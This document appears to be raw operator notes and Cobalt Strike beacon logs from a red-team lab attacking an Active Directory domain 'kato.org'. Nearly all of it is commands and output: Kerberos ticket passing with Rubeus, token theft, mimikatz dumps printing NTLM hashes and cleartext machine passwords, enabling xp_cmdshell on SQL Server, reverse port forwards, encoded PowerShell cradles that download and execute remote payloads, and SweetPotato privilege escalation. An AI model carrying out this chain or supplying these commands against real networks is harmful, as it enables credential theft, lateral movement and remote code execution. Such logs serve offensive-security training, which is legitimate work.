WRSy0Vv7OAjLIerUUgauPS+OCbWpG0/QPayp4mfoLGVreDbtgxLwv2ogXXxSfIdnFy7kA1kGR6EVpBS4iCXIXI768loC2YPEl1rJxn5fV0+pQLB01Sin8fBXdz0Qvlj2kChKplP8AoUxkj8lyZ4ZXp61o7sgLF8JYGyiJ52VH+9KjJwMuxAPsZd+xrVR8KdXrjGhvLvIMuOP8hCa0T4NrCURyfi2egDhdhLkl+tnpOhWR54iFNyU0stklY/6V1IhByyfazgmb7cyGEopSHj/itVUUj+TwgmjgdkwgdagAwIBAKKBzgSBy32ByDCBxaCBwjCBvzCBvKArMCmgAwIBEqEiBCA1wJ/Fz2hMK+A6L3gU2LuKqq29jcUQi4wWS/WGtgYL86ELGwlBQ01FLkNPUlCiEjAQoAMCAQGhCTAHGwVsbW9ua6MHAwUAQKUAAKURGA8yMDI1MDQyNDE0MzYxMVqmERgPMjAyNTA0MjQyMzI1MDVapxEYDzIwMjUwNTAxMTMyNTA1WqgKGwhLQVRPLk9SR6keMBygAwIBAqEVMBMbBGNpZnMbC2FkLmthdG8ub3Jn
```


```
[04/24 14:41:17] beacon> powerpick Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators -Domain Kato.org | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl
[04/24 14:41:17] [*] Tasked beacon to run: Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators -Domain Kato.org | select ObjectName, GPODisplayName, ContainerName, ComputerName | fl (unmanaged)
[04/24 14:41:19] [+] host called home, sent: 138058 bytes
[04/24 14:41:23] [+] received output:


ObjectName     : Foreign Kato Users
GPODisplayName : Jump Users
ContainerName  : {OU=Jump,OU=Servers,DC=kato,DC=org}
ComputerName   : {jmp.kato.org}

```




```
[04/24 15:49:07] beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:doIFYjCCBV6gAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoQobCEtBVE8uT1JHoh8wHaADAgECoRYwFBsEY2lmcxsMam1wLmthdG8ub3Jno4IEMTCCBC2gAwIBEqEDAgEBooIEHwSCBBtDAY/s025hAR13sRna/6cm7nhOnu/hsPdGNPm7Z4Oi1SKft366rdklPHHN16yTDixFcx6i0XBr/corgOkJW+4WFfHr3dh2i2YsMQupDmHeaC8haYxcSfgKIXQgkjyt4UGH4KZNBDMhKeyafl1CQY7PLcehGpjTL7tmm0B3Y7vP7vrkj4nAoVR2ULj8zhRp8Yr86+aJ7ABihwpCoKNcUjYKoMDrt7D9RDmf3fyuhLD05rLD7Ccpp0uEgK8ni3aLsp4oKjpHVbWMuDA20tRBICh+vbdXDcTMCMIg5sUfcl7iJUoXo9fSm2Uxhy2mrdPUCujVqOHCXQC+Qx3RwBtJfeyw8EdyYf3THastc7vpz+9u/IWZcHSuX5Cj8ANBRZ5Y5qOwuFA8ZJle1eWEFEzIHrVHBwOOHoae4WhKLUE3qzURlWF6bMB9NbJYyIXbbUj6vjXdUHO/mXVxUuoMmSojuY6CsFN+IWimDZxqL/H72FXwjqbJLEWTvlxB+BJfHIPDSJg/rNhKEU/GtaoLCtgAkRRFrevu3qyXJbCJSMFnN/vQn+Kdtw62Zl9+9u6+1tN+G2xN/JnhNVXaqboPUnV/qjynEeRZYBTjVirvK+AS5x/7JqIG2KV2SS+GiLU1JmAVXX1IcQhF2dulWzirTVmEr7mEC8346rw4zcxqPwoEtQ7N3kBQ60OqFW8tSen43Xl5KvlEl2tsQYga91g01pgBQGTnohQidFIblyLYulhcV978hLp+5BqVJ1APJnZkp9Q8jMAi6trgLblSCCpZdkJbiOOoZWgABLn0IzJ+F6BARWmKc/QXIaYxZtEMfBbpBUZNSnXH+8Z0Pk9xSvMhQ2OrxYNNH75ilPDqlkKipkP4TcasM5pSxPBZzgN7waVGrfyHPsI3PMudIQRaOCpGvSI4Js8UAYRl7+OCnyzREveXv199qoYE+nmOV+wEycuKkjL8yJI3slf/Aw0qgyNccmwR2FsmKhPePoYgFio+7MQehvj1fGrDZalBcHdX4vxH0o2s/WQUKZHvSC256oKRp3i42aSRCjVDJvwHNWHU9IEqcDwsfYO3kZXr/wGyGkCEPGMdA1cLfBTC7If5kva13rVOLMUtREHKQr94zQF38mMzJS6Xo44jqVCWuWa4RxYDzCGJXJrZpjzkIr3IL6MIHG1nxoCw31Qd/9Qu15odnuWaoZzz+Pp9mexRPwhwvLj6jKcBH54mK/TXvZzrk5rAifKvpyn7F+qoOoHES+3lkz3S1rqi2qO8TZCnts/SWytTg5IozbQHJ8+IMw2CvUPDw1m0ezIBwKNW6P3UQfBGeQQUewL+FN72hNqmlmbUptV5HExVnCJXmxjjd+UHYnagW8neDfzwwlizOpZldTV4NOqw+GLVFXCQc9YxTTHLguQXo4HaMIHXoAMCAQCigc8Egcx9gckwgcaggcMwgcAwgb2gKzApoAMCARKhIgQggaaE5XLJ51RQ7Fw6n2CmrscuelZfuG5b9ZRmmGnNvu6hCxsJQUNNRS5DT1JQohIwEKADAgEBoQkwBxsFbG1vbmujBwMFAEChAAClERgPMjAyNTA0MjQxNDQ4MzdaphEYDzIwMjUwNDI1MDA0NDMzWqcRGA8yMDI1MDUwMTE0NDQzM1qoChsIS0FUTy5PUkepHzAdoAMCAQKhFjAUGwRjaWZzGwxqbXAua2F0by5vcmc=
[04/24 15:49:11] [*] Tasked beacon to run .NET program: Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /ticket:doIFYjCCBV6gAwIBBaEDAgEWooIEczCCBG9hggRrMIIEZ6ADAgEFoQobCEtBVE8uT1JHoh8wHaADAgECoRYwFBsEY2lmcxsMam1wLmthdG8ub3Jno4IEMTCCBC2gAwIBEqEDAgEBooIEHwSCBBtDAY/s025hAR13sRna/6cm7nhOnu/hsPdGNPm7Z4Oi1SKft366rdklPHHN16yTDixFcx6i0XBr/corgOkJW+4WFfHr3dh2i2YsMQupDmHeaC8haYxcSfgKIXQgkjyt4UGH4KZNBDMhKeyafl1CQY7PLcehGpjTL7tmm0B3Y7vP7vrkj4nAoVR2ULj8zhRp8Yr86+aJ7ABihwpCoKNcUjYKoMDrt7D9RDmf3fyuhLD05rLD7Ccpp0uEgK8ni3aLsp4oKjpHVbWMuDA20tRBICh+vbdXDcTMCMIg5sUfcl7iJUoXo9fSm2Uxhy2mrdPUCujVqOHCXQC+Qx3RwBtJfeyw8EdyYf3THastc7vpz+9u/IWZcHSuX5Cj8ANBRZ5Y5qOwuFA8ZJle1eWEFEzIHrVHBwOOHoae4WhKLUE3qzURlWF6bMB9NbJYyIXbbUj6vjXdUHO/mXVxUuoMmSojuY6CsFN+IWimDZxqL/H72FXwjqbJLEWTvlxB+BJfHIPDSJg/rNhKEU/GtaoLCtgAkRRFrevu3qyXJbCJSMFnN/vQn+Kdtw62Zl9+9u6+1tN+G2xN/JnhNVXaqboPUnV/qjynEeRZYBTjVirvK+AS5x/7JqIG2KV2SS+GiLU1JmAVXX1IcQhF2dulWzirTVmEr7mEC8346rw4zcxqPwoEtQ7N3kBQ60OqFW8tSen43Xl5KvlEl2tsQYga91g01pgBQGTnohQidFIblyLYulhcV978hLp+5BqVJ1APJnZkp9Q8jMAi6trgLblSCCpZdkJbiOOoZWgABLn0IzJ+F6BARWmKc/QXIaYxZtEMfBbpBUZNSnXH+8Z0Pk9xSvMhQ2OrxYNNH75ilPDqlkKipkP4TcasM5pSxPBZzgN7waVGrfyHPsI3PMudIQRaOCpGvSI4Js8UAYRl7+OCnyzREveXv199qoYE+nmOV+wEycuKkjL8yJI3slf/Aw0qgyNccmwR2FsmKhPePoYgFio+7MQehvj1fGrDZalBcHdX4vxH0o2s/WQUKZHvSC256oKRp3i42aSRCjVDJvwHNWHU9IEqcDwsfYO3kZXr/wGyGkCEPGMdA1cLfBTC7If5kva13rVOLMUtREHKQr94zQF38mMzJS6Xo44jqVCWuWa4RxYDzCGJXJrZpjzkIr3IL6MIHG1nxoCw31Qd/9Qu15odnuWaoZzz+Pp9mexRPwhwvLj6jKcBH54mK/TXvZzrk5rAifKvpyn7F+qoOoHES+3lkz3S1rqi2qO8TZCnts/SWytTg5IozbQHJ8+IMw2CvUPDw1m0ezIBwKNW6P3UQfBGeQQUewL+FN72hNqmlmbUptV5HExVnCJXmxjjd+UHYnagW8neDfzwwlizOpZldTV4NOqw+GLVFXCQc9YxTTHLguQXo4HaMIHXoAMCAQCigc8Egcx9gckwgcaggcMwgcAwgb2gKzApoAMCARKhIgQggaaE5XLJ51RQ7Fw6n2CmrscuelZfuG5b9ZRmmGnNvu6hCxsJQUNNRS5DT1JQohIwEKADAgEBoQkwBxsFbG1vbmujBwMFAEChAAClERgPMjAyNTA0MjQxNDQ4MzdaphEYDzIwMjUwNDI1MDA0NDMzWqcRGA8yMDI1MDUwMTE0NDQzM1qoChsIS0FUTy5PUkepHzAdoAMCAQKhFjAUGwRjaWZzGwxqbXAua2F0by5vcmc=
[04/24 15:49:23] [+] host called home, sent: 559578 bytes
[04/24 15:49:24] [+] received output:

   ______        _                      
  (_____ \      | |                     
   _____) )_   _| |__  _____ _   _  ___ 
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0 


[*] Action: Create Process (/netonly)


[*] Using random username and password.

[*] Showing process : False
[*] Username        : JOFMPJAF
[*] Domain          : EE2D9FW4
[*] Password        : ZVOBYXL6
[+] Process         : 'C:\Windows\System32\cmd.exe' successfully created with LOGON_TYPE = 9
[+] ProcessID       : 416
[+] Ticket successfully imported!
[+] LUID            : 0x4a9257

[04/24 15:49:41] beacon> steal_token 416
[04/24 15:49:41] [*] Tasked beacon to steal token from PID 416
[04/24 15:49:50] beacon> ls \\jmp.kato.org\C$
[04/24 15:49:50] [*] Tasked beacon to list files in \\jmp.kato.org\C$
[04/24 15:49:54] [+] host called home, sent: 47 bytes
[04/24 15:49:54] [+] Impersonated NT AUTHORITY\SYSTEM
[04/24 15:49:54] [*] Listing: \\jmp.kato.org\C$\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     10/06/2022 12:39:21   $Recycle.Bin
          dir     09/14/2022 16:07:20   $WinREAgent
          dir     09/14/2022 16:18:55   Boot
          dir     08/18/2021 23:34:55   Documents and Settings
          dir     08/19/2021 06:24:49   EFI
          dir     05/08/2021 08:20:24   PerfLogs
          dir     08/19/2021 06:35:15   Program Files
          dir     09/14/2022 15:19:23   Program Files (x86)
          dir     10/11/2022 11:16:47   ProgramData
          dir     10/06/2022 12:06:47   Recovery
          dir     10/06/2022 12:06:29   System Volume Information
          dir     10/27/2022 11:34:26   Users
          dir     10/06/2022 12:06:41   Windows
 427kb    fil     09/14/2022 16:13:26   bootmgr
 1b       fil     05/08/2021 08:14:33   BOOTNXT
 12kb     fil     04/24/2025 07:26:06   DumpStack.log.tmp
 384mb    fil     04/24/2025 07:26:06   pagefile.sys
```




```
[04/24 15:56:49] beacon> powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[04/24 15:56:52] [*] Tasked beacon to import: C:\Tools\PowerUpSQL\PowerUpSQL.ps1
[04/24 15:56:55] [+] host called home, sent: 202192 bytes
[04/24 15:57:08] beacon> powerpick Get-SQLInstanceDomain
[04/24 15:57:08] [*] Tasked beacon to run: Get-SQLInstanceDomain (unmanaged)
[04/24 15:57:10] [+] host called home, sent: 138058 bytes
[04/24 15:57:14] [+] received output:


ComputerName     : db.kato.org
Instance         : db.kato.org,1433
DomainAccountSid : 15000005210002142321161618413321520524029150984400
DomainAccount    : DB$
DomainAccountCn  : DB
Service          : MSSQLSvc
Spn              : MSSQLSvc/db.kato.org:1433
LastLogon        : 4/24/2025 2:50 PM
Description      : 

ComputerName     : db.kato.org
Instance         : db.kato.org
DomainAccountSid : 15000005210002142321161618413321520524029150984400
DomainAccount    : DB$
DomainAccountCn  : DB
Service          : MSSQLSvc
Spn              : MSSQLSvc/db.kato.org
LastLogon        : 4/24/2025 2:50 PM
Description      : 
```


```
[04/24 15:59:45] beacon> powerpick Get-SQLConnectionTest -Instance "db.kato.org,1433" | fl
[04/24 15:59:45] [*] Tasked beacon to run: Get-SQLConnectionTest -Instance "db.kato.org,1433" | fl (unmanaged)
[04/24 15:59:47] beacon> clear
[04/24 15:59:47] [*] Cleared beacon queue
[04/24 15:59:48] [+] received output:


ComputerName : db.kato.org
Instance     : db.kato.org,1433 
Status       : Not Accessible


```



```python
[04/24 16:00:29] beacon> mimikatz sekurlsa::logonpasswords
[04/24 16:00:31] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[04/24 16:00:36] [+] host called home, sent: 815435 bytes
[04/24 16:00:37] [+] received output:

Authentication Id : 0 ; 303211 (00000000:0004a06b)
Session           : Interactive from 1
User Name         : mhindle
Domain            : KATO
Logon Server      : AD
Logon Time        : 4/24/2025 7:26:33 AM
SID               : S-1-5-21-2708793558-3453453652-160833008-1106
	msv :	
	 [00000003] Primary
	 * Username : mhindle   <------------------- useful
	 * Domain   : KATO
	 * NTLM     : 616503ea6f8cd236750a40db5e00d7a2   <------------------- useful
	 * SHA1     : fd35c56f4a2d2484d787f3cc36cf75a049846d94
	 * DPAPI    : 0fe8acc7ee2b4e351b6325d891c4e026
	tspkg :	
	wdigest :	
	 * Username : mhindle
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : mhindle
	 * Domain   : KATO.ORG
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : JMP$
Domain            : KATO
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:07 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : JMP$
	 * Domain   : KATO
	 * NTLM     : f62cdc8cdb0c818df7a6f1788e15413d
	 * SHA1     : 839dfde9b824ac7e097e97e766c001ddf5d29c86
	tspkg :	
	wdigest :	
	 * Username : JMP$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : jmp$
	 * Domain   : KATO.ORG
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 25109 (00000000:00006215)
Session           : Interactive from 0
User Name         : UMFD-0
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:07 AM
SID               : S-1-5-96-0-0
	msv :	
	 [00000003] Primary
	 * Username : JMP$
	 * Domain   : KATO
	 * NTLM     : f62cdc8cdb0c818df7a6f1788e15413d
	 * SHA1     : 839dfde9b824ac7e097e97e766c001ddf5d29c86
	tspkg :	
	wdigest :	
	 * Username : JMP$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : JMP$
	 * Domain   : kato.org
	 * Password : TU]r4-eP>hz-D3^=cldoasO-@Oc(^*(\3N-'U1J3\fIZ-"9]M=Aa;i9B0_'xffPQl_FFB$B)5T7DuQW%lNel57rJ00Wz5uK^XPN#N(KrsZYTQ`OAOAzpKKi#
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 25084 (00000000:000061fc)
Session           : Interactive from 1
User Name         : UMFD-1
Domain            : Font Driver Host
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:07 AM
SID               : S-1-5-96-0-1
	msv :	
	 [00000003] Primary
	 * Username : JMP$
	 * Domain   : KATO
	 * NTLM     : f62cdc8cdb0c818df7a6f1788e15413d
	 * SHA1     : 839dfde9b824ac7e097e97e766c001ddf5d29c86
	tspkg :	
	wdigest :	
	 * Username : JMP$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : JMP$
	 * Domain   : kato.org
	 * Password : TU]r4-eP>hz-D3^=cldoasO-@Oc(^*(\3N-'U1J3\fIZ-"9]M=Aa;i9B0_'xffPQl_FFB$B)5T7DuQW%lNel57rJ00Wz5uK^XPN#N(KrsZYTQ`OAOAzpKKi#
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:08 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 44074 (00000000:0000ac2a)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:08 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : JMP$
	 * Domain   : KATO
	 * NTLM     : f62cdc8cdb0c818df7a6f1788e15413d
	 * SHA1     : 839dfde9b824ac7e097e97e766c001ddf5d29c86
	tspkg :	
	wdigest :	
	 * Username : JMP$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : JMP$
	 * Domain   : kato.org
	 * Password : TU]r4-eP>hz-D3^=cldoasO-@Oc(^*(\3N-'U1J3\fIZ-"9]M=Aa;i9B0_'xffPQl_FFB$B)5T7DuQW%lNel57rJ00Wz5uK^XPN#N(KrsZYTQ`OAOAzpKKi#
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 44050 (00000000:0000ac12)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:08 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : JMP$
	 * Domain   : KATO
	 * NTLM     : f62cdc8cdb0c818df7a6f1788e15413d
	 * SHA1     : 839dfde9b824ac7e097e97e766c001ddf5d29c86
	tspkg :	
	wdigest :	
	 * Username : JMP$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : JMP$
	 * Domain   : kato.org
	 * Password : TU]r4-eP>hz-D3^=cldoasO-@Oc(^*(\3N-'U1J3\fIZ-"9]M=Aa;i9B0_'xffPQl_FFB$B)5T7DuQW%lNel57rJ00Wz5uK^XPN#N(KrsZYTQ`OAOAzpKKi#
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 23957 (00000000:00005d95)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:07 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : JMP$
	 * Domain   : KATO
	 * NTLM     : f62cdc8cdb0c818df7a6f1788e15413d
	 * SHA1     : 839dfde9b824ac7e097e97e766c001ddf5d29c86
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : JMP$
Domain            : KATO
Logon Server      : (null)
Logon Time        : 4/24/2025 7:26:07 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : JMP$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : jmp$
	 * Domain   : KATO.ORG
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

```



```python
[04/24 16:01:44] beacon> mimikatz !lsadump::cache
[04/24 16:01:47] [*] Tasked beacon to run mimikatz's !lsadump::cache command
[04/24 16:01:53] [+] host called home, sent: 815426 bytes
[04/24 16:01:54] [+] received output:
Domain : JMP
SysKey : fc250c86df6aaff77dffbd26608def5d

Local name : JMP ( S-1-5-21-1950583571-4023683361-3870322958 )
Domain name : KATO ( S-1-5-21-2708793558-3453453652-160833008 )
Domain FQDN : kato.org

Policy subsystem is : 1.18
LSA Key(s) : 1, default {ca26646d-2203-daf7-396b-02ae972d3314}
  [00] {ca26646d-2203-daf7-396b-02ae972d3314} 45fde9dbe74210c491bc06d3c6e5b6d16d6e01a897f75108c576c227cbdb5c9d

* Iteration is set to default (10240)

[NL$1 - 10/27/2022 11:34:26 AM]
RID       : 00000452 (1106)
User      : KATO\mhindle
MsCacheV2 : e8f8206d50d7b257dbe5bf3756f5f711
```


```python
[04/24 16:05:09] beacon> powerpick Get-DomainUser -Identity mhindle -Properties DisplayName, MemberOf | fl
[04/24 16:05:09] [*] Tasked beacon to run: Get-DomainUser -Identity mhindle -Properties DisplayName, MemberOf | fl (unmanaged)
[04/24 16:05:10] [+] host called home, sent: 138058 bytes
[04/24 16:05:14] [+] received output:


displayname : Michal Hindle
memberof    : CN=MS SQL Admins,CN=Users,DC=kato,DC=org
```


```python
[04/24 16:18:10] beacon> powerpick Get-SQLConnectionTest -Instance "db.kato.org,1433" | fl
[04/24 16:18:10] [*] Tasked beacon to run: Get-SQLConnectionTest -Instance "db.kato.org,1433" | fl (unmanaged)
[04/24 16:18:10] [+] host called home, sent: 138058 bytes
[04/24 16:18:13] [+] received output:


ComputerName : db.kato.org
Instance     : db.kato.org,1433
Status       : Accessible
```


```python
[04/24 16:29:14] beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:whoami
[04/24 16:29:15] [*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:whoami
[04/24 16:29:16] [+] host called home, sent: 307534 bytes
[04/24 16:29:16] [+] received output:
[*] Determining user permissions on db.kato.org,1433
[*] Logged in as KATO\mhindle
[*] Mapped to the user dbo
[*] Roles:
 |-> User is a member of public role.
 |-> User is NOT a member of db_owner role.
 |-> User is NOT a member of db_accessadmin role.
 |-> User is NOT a member of db_securityadmin role.
 |-> User is NOT a member of db_ddladmin role.
 |-> User is NOT a member of db_backupoperator role.
 |-> User is NOT a member of db_datareader role.
 |-> User is NOT a member of db_datawriter role.
 |-> User is NOT a member of db_denydatareader role.
 |-> User is NOT a member of db_denydatawriter role.
 |-> User is a member of sysadmin role.
 |-> User is a member of setupadmin role.
 |-> User is a member of serveradmin role.
 |-> User is a member of securityadmin role.
 |-> User is a member of processadmin role.
 |-> User is a member of diskadmin role.
 |-> User is a member of dbcreator role.
 |-> User is a member of bulkadmin role.
```


```python
[04/24 16:34:27] beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:enablexp
[04/24 16:34:29] [*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:enablexp
[04/24 16:34:30] [+] host called home, sent: 307538 bytes
[04/24 16:34:30] [+] received output:
[*] Enabling xp_cmdshell on db.kato.org,1433
[+] SUCCESS: Enabled xp_cmdshell on db.kato.org,1433.
name | value | 
---------------
xp_cmdshell | 1 |

```



```python
[04/24 16:38:12] beacon> execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:xpcmd /c:whoami
[04/24 16:38:13] [*] Tasked beacon to run .NET program: SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:xpcmd /c:whoami
[04/24 16:38:14] [+] host called home, sent: 307552 bytes
[04/24 16:38:15] [+] received output:
[*] Executing 'whoami' on db.kato.org,1433
output | 
---------
|nt service\mssqlserver|
```


```
\\JMP.KATO.ORG\C\Windows\temp\new
```


```
powerpick New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080
```

rpotforwards time

##### Testing

this was done on workstation

```
[04/25 13:46:37] beacon> rportfwd 8080 127.0.0.1 80
[04/25 13:46:37] [+] started reverse port forward on 8080 to 127.0.0.1:80
[04/25 13:46:37] [*] Tasked beacon to forward port 8080 to 127.0.0.1:80
[04/25 13:46:37] [+] host called home, sent: 22 bytes
```


```
04/25 13:49:59 visit (port 80) from: 127.0.0.1
	Request: GET /bacon.ps1
	page Serves /home/attacker/cobaltstrike/uploads/bacon.ps1
	Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.19041.1682
```


```python
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:xpcmd /c:whoami
```



how to encode smth in powershell

```python
$command = 'IEX ((New-Object Net.WebClient).DownloadString("http://<CHANGE.ME>:80/a"))'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```

edited for the hosted file

```python
$command = 'IEX ((New-Object Net.WebClient).DownloadString("http://JMP.KATO.ORG:8080/smb.ps1"))'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)
powershell.exe -EncodedCommand $encodedCommand
```


```
blob1;



blob2;



```


```python
execute-assembly C:\Tools\SQLRecon\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:db.kato.org,1433 /m:xpcmd /c:"powershell.exe -e SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcAA6AC8ALwBKAE0AUAAuAEsAQQBUAE8ALgBPAFIARwA6ADgAMAA4ADAALwBhAG0AcwBpAC4AcABzADEAIAAtAHUAcwBlAGIAKQA7AEkARQBYACAAKABpAHIAbQAgAGgAdAB0AHAAOgAvAC8ASgBNAFAALgBLAEEAVABPAC4ATwBSAEcAOgA4ADAAOAAwAC8AcwBtAGIALgBwAHMAMQAgAC0AdQBzAGUAYgApAA=="
```



so i can curl jmp.kato.org

on jmp
```
rportfwd 8080 10.10.5.50 80
```


on the workstation

```
curl http://jmp.kato.org:8080/bacon.ps1 -o ASDASDASDASDASD.ps1
```


```
04/25 13:58:28 visit (port 80) from: 10.10.5.50
	Request: GET /bacon.ps1
	page Serves /home/attacker/cobaltstrike/uploads/bacon.ps1
	Mozilla/5.0 (Windows NT; Windows NT 10.0; en-GB) WindowsPowerShell/5.1.19041.1682
```




```
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc SQBFAFgAIAAoAGkAcgBtACAAaAB0AHQAcAA6AC8ALwBKAE0AUAAuAEsAQQBUAE8ALgBPAFIARwA6ADgAMAA4ADAALwBhAG0AcwBpAC4AcABzADEAIAAtAHUAcwBlAGIAKQA7AEkARQBYACAAKABpAHIAbQAgAGgAdAB0AHAAOgAvAC8ASgBNAFAALgBLAEEAVABPAC4ATwBSAEcAOgA4ADAAOAAwAC8AYgAgAC0AdQBzAGUAYgApAA=="
```




```python
[04/25 14:37:59] beacon> mimikatz sekurlsa::logonpasswords
[04/25 14:38:01] [*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
[04/25 14:38:01] [+] host called home, sent: 815435 bytes
[04/25 14:38:03] [+] received output:

Authentication Id : 0 ; 74717 (00000000:000123dd)
Session           : Service from 0
User Name         : SQLTELEMETRY
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:20 AM
SID               : S-1-5-80-2652535364-2169709536-2857650723-2622804123-1107741775
	msv :	
	 [00000003] Primary
	 * Username : DB$
	 * Domain   : KATO
	 * NTLM     : fe64feaea0b3665b88dd9e5137604726   <------------------------
	 * SHA1     : 283b24a26e6d00142f504323b12e5a84cd9cb1d5
	tspkg :	
	wdigest :	
	 * Username : DB$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : DB$
	 * Domain   : kato.org
	 * Password : H@fWIk<B]U(:E->:]aBJK':CMcT-FVoWu/!oZ^q14fIM_foA*TRNP:]U'7W@BcGfZyX;.ZeippR>b_S=X#icO5&^yhRT%J$g08Hz'8`*:'$P;Hf3nMj)FhZi
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : DB$
Domain            : KATO
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:18 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : DB$
	 * Domain   : KATO
	 * NTLM     : fe64feaea0b3665b88dd9e5137604726
	 * SHA1     : 283b24a26e6d00142f504323b12e5a84cd9cb1d5
	tspkg :	
	wdigest :	
	 * Username : DB$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : db$
	 * Domain   : KATO.ORG
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 75146 (00000000:0001258a)
Session           : Service from 0
User Name         : MSSQLSERVER
Domain            : NT Service
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:20 AM
SID               : S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003
	msv :	
	 [00000003] Primary
	 * Username : DB$
	 * Domain   : KATO
	 * NTLM     : fe64feaea0b3665b88dd9e5137604726
	 * SHA1     : 283b24a26e6d00142f504323b12e5a84cd9cb1d5
	tspkg :	
	wdigest :	
	 * Username : DB$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : DB$
	 * Domain   : KATO.ORG
	 * Password : (null)
	ssp :	
	credman :	
	cloudap :	

Authentication Id : 0 ; 45883 (00000000:0000b33b)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 4/25/2025 6:56:19 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : DB$
	 * Domain   : KATO
	 * NTLM     : fe64feaea0b3665b88dd9e5137604726
	 * SHA1     : 283b24a26e6d00142f504323b12e5a84cd9cb1d5
	tspkg :	
	wdigest :	
	 * Username : DB$
	 * Domain   : KATO
	 * Password : (null)
	kerberos :	
	 * Username : DB$
	 * Domain   : kato.org
